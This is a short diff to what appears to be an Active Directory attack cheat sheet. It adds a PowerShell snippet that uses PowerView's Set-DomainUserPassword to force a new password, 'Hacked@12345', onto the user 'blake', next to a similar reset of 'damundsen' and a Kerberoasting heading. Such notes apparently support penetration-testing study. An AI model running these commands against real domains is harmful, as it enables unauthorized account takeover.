@@ -144,6 +144,12 @@ using PowerView change the password
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 ```
 
+### or if you are in context of the AD object 
+```powershell
+$blakePassword = ConvertTo-SecureString 'Hacked@12345' -AsPlainText -Force
+Set-DomainUserPassword -Domain painters -Identity blake -AccountPassword $blakePassword  -Verbose
+
+```
 
 
 ## Targeted Kerberoasting
